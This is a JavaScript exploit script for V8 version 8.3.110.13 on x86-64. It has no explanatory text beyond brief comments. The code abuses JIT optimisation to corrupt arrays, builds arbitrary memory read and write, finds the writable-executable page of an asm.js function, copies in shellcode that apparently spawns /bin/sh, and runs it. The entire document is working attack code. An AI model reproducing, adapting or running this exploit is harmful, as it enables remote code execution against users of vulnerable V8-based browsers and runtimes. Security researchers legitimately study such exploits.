// V8 version 8.3.110.13 on x86-64
// Hardcoding Address/Offset:
//   [1] const fake_str(determined during compilation)
//   [2] Array.prototype
//   [3] Map of PACKED_DOUBLE Array
function hex(a, b=-1) {
    if (b != -1) {
        a = '00000000'+a.toString(16);
        b = '00000000'+b.toString(16);
        a = a.substring(a.length-8,a.length);
        b = b.substring(b.length-8,b.length);
        return '0x'+a+b;
    }
    return '0x' + a.toString(16);
}
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
Number.prototype.hex = function() {
    return '0x' + this.toString(16);
};
function gc() {
    for (let i = 0; i < 0x10000; i++)
        new String
}
function Module() {
    "use asm"
    function f1() {}
    return {f1: f1}
}
Module().f1();
const shellcode = [0xb848686a, 0x6e69622f, 0x732f2f2f, 0xe7894850, 0x1697268, 0x24348101, 0x1010101, 0x6a56f631, 0x1485e08, 0x894856e6, 0x6ad231e6, 0x50f583b];

// let fake_str = 'AAA';
// fake_str += '\x91\x18\x24\x08'; // DoubleArray's map
// fake_str += '\x00\x00\x00\x00'; // Property
// fake_str += '\xe1\x91\x20\x08'; // Elements(Array.prototype)
// fake_str += '\x00\x20\x00\x00'; // Length
const fake_str = 'AAA\x91\x18\x24\x08\x00\x00\x00\x00\xe1\x91\x20\x08\x00\x20\x00\x00';

let t_ab = new ArrayBuffer(0x20);
let f64a = new Float64Array(t_ab);
let u32a = new Uint32Array(t_ab);

function evil(obj, flag) {
    for (let i = 0; i < 10000000; i++) {}
    u32a[0] = 0x82091e1;
    u32a[1] = 0x10;
    obj.x[0] = f64a[0];
}

const m_0 = {};
m_0.x = new Array(1.1,2.2);
evil(m_0);
m_0.x = new Array(1.1,2.2);
evil(m_0);

gc();gc();
gc();gc();

function opt(flag) {
    for (let i = 0; i < 10000000; i++) {}

    const obj = {};
    // 0x08210050 / 2
    // (0x08210050 / 2 + 3000000000) / 2
    for (let i = -3000000000; i <= 68190248; i += 1534095124) {
        obj.x = i;
    }

    if (flag) {
        obj + obj;
        evil(obj, 1);
    }
}
opt(0);
opt(1);

let o = {};
let evil_da = new Array(1.1, 2.2, 3.3);
let evil_ta = new Uint32Array(4);
let evil_func = Module().f1;
o.a = o;
o.b = evil_da;
o.c = evil_ta;
o.d = evil_func;
Array.prototype[0] = evil_da;
Array.prototype[1] = 0x200;
Array.prototype[0] = o;
let evil_func_addr = (f64a[0] = evil_da[2], u32a[0]) - 1;
/*
console.log(evil_func_addr.hex());
function addrof(obj) {
    o.a = obj;
    f64a[0] = evil_da[0];
    return u32a[1];
}
function fakeobj(addr) {
    u32a[1] = addr;
    evil_da[0] = f64a[0];
    return o.a;
}
*/
let evil_ta_addr = (f64a[0] = evil_da[1], u32a[1]);
Array.prototype[0] = evil_ta;
evil_da[3] = (u32a[0] = 0x100, u32a[1] = 0, f64a[0]);
evil_da[4] = (f64a[0] = evil_da[4], u32a[0] = 0, f64a[0]);
let v8_high_addr = u32a[1];
function arb_mem(addr) {
    evil_da[5] = (u32a[0] = addr, u32a[1] = 0, f64a[0]);
}
function arb_read(addr) {
    arb_mem(addr);
    return evil_ta[0];
}
function arb_write(addr, val) {
    arb_mem(addr);
    evil_ta[0] = val;
}
let shared_info_addr = arb_read(evil_func_addr + 12) - 1;

arb_mem(shared_info_addr - 0x84);
let rwx_addr_low = evil_ta[0];
let rwx_addr_high = evil_ta[1];
evil_da[4] = (u32a[0] = evil_ta[0], u32a[1] = evil_ta[1], f64a[0]);
evil_da[5] = 0
shellcode.forEach((sc, i) => {
    evil_ta[i] = sc;
});
evil_func();